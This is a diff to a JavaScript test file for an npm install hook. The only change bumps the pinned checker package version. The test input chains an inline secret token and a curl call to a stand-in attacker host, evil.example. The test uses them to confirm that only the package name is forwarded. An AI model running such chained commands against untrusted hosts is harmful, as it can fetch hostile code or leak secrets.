@@ -41,7 +41,7 @@ test("the hook hands the check the package name and nothing else of the command,
   const r = run("cd /tmp && SECRET_TOKEN=hunter2 npm install left-pad --registry https://r.example.com && curl https://evil.example/x");
   assert.equal(r.status, 0);
   assert.equal(r.calls.length, 1);
-  assert.deepEqual(r.calls[0].argv, ["-y", "@kenwea/mcp@0.7.3", "check", "left-pad", "--json"]);
+  assert.deepEqual(r.calls[0].argv, ["-y", "@kenwea/mcp@0.8.0", "check", "left-pad", "--json"]);
   assert.equal(r.stdout, "", "nothing runs at install, so nothing is said");
   assert.deepEqual(readdirSync(r.home), [], "the hook wrote into HOME");
   assert.deepEqual(readdirSync(r.cwd), [], "the hook wrote into the working directory");
